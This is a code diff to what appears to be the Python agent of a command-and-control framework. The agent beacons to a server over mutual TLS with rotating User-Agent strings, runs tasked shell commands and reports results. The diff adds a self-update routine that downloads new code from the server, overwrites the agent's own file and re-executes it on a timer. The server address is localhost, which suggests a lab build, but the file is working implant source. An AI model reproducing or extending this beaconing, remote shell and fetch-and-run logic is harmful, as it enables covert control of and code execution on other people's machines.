@@ -14,8 +14,8 @@ import importlib.util
 from multiprocessing import Process
 from datetime import datetime ,timezone
 from pathlib import Path
-
-
+import shutil
+import threading
 SERVER_URL = "https://127.0.0.1"
 BEACON_ENDPOINT = "/beacon"
 RESULT_ENDPOINT = "/result"
@@ -45,14 +45,13 @@ session = requests.Session()
 os.makedirs("./keys", exist_ok=True)
 BASE_DIR = Path(__file__).resolve().parent
 CA_CERT = BASE_DIR / "keys" / "ca.crt"
-# The 'cert' tuple contains the (client_cert, client_key)
 session.verify = str(CA_CERT)
 session.cert = (
     BASE_DIR / "keys" / f"agent{AGENT_ID}.crt",
     BASE_DIR / "keys" / f"agent{AGENT_ID}.key",
 )
 
-
+''' check if mTLS works
 def run_mtls_requests():
     headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
 
@@ -74,7 +73,7 @@ def run_mtls_requests():
     except requests.exceptions.SSLError as e:
         print("\nPossible causes:\n1. Server doesn't trust the Client CA\n2. Client cert is expired\n3. Wrong CA file provided in 'verify'")
     except requests.exceptions.RequestException as e:
-        print(f"Connection Error: {e}")
+        print(f"Connection Error: {e}")'''
 
 
 def encrypt_data(data):
@@ -214,6 +213,50 @@ def execute_task(task, task_uuid):
         print(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds")
         executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
         post_result(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds",task_uuid,executed_at)
+
+
+def agent_update_periodic(seconds=60):
+    '''
+    Not used yet, needs updating and restructure
+    '''
+    def agent_update():
+        agent_file = os.path.abspath(__file__)
+        update_url = SERVER_URL + "/agent_update"
+        agent_version = "1.0.2"
+
+        try:
+            print("Checking for update...")
+
+            headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
+            payload = {"version": agent_version, "id": AGENT_ID}
+            encrypted_payload = encrypt_data(json.dumps(payload))
+
+            response = session.post(update_url, headers=headers, json=payload)
+            response.raise_for_status()
+
+            if response.status_code == 400:
+                print("No update available.")
+            else:
+                tmp_file = agent_file + ".tmp"
+                with open(tmp_file, "wb") as f:
+                    f.write(response.content)
+
+                backup_file = agent_file + ".bak"
+                shutil.move(agent_file, backup_file)
+                shutil.move(tmp_file, agent_file)
+
+                print("Update applied! Restarting...")
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+
+        except Exception as e:
+            print("Update failed:", e)
+
+        # Reschedule the next run
+        threading.Timer(seconds, agent_update).start()
+
+    # Initial call
+    agent_update()
+
 
 
 def execute_shell(command, task_uuid):
@@ -388,6 +431,7 @@ def main():
     while attempts < 5:
         if login():
             print("[+] Agent authenticated")
+            #agent_update_periodic()
             break
         else:
             attempts += 1
@@ -399,7 +443,7 @@ def main():
 
     # Main loop after successful login
     while True:
-        run_mtls_requests()
+        #run_mtls_requests()
         beacon()
         sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
         print(f"[+] Sleeping {sleep_time} seconds")
